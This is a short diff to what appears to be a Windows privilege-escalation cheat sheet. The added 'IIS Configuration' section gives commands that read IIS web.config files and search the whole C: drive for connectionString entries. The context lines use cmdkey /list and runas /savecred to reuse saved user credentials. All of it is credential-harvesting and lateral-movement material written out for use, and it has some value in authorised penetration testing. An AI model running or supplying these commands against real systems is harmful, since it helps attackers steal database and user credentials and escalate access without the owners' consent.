@@ -27,3 +27,9 @@ cmdkey /list # show save user credentials
 runas /savecred /user:<username> cmd.exe # run cmd with another user 
 runas /savecred /user:<username> powershell.exe # run powershell with another user
 ```
+# IIS Configuration ✅
+```cmd
+type C:\inetpub\wwwroot\web.config | findstr connectionString
+forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
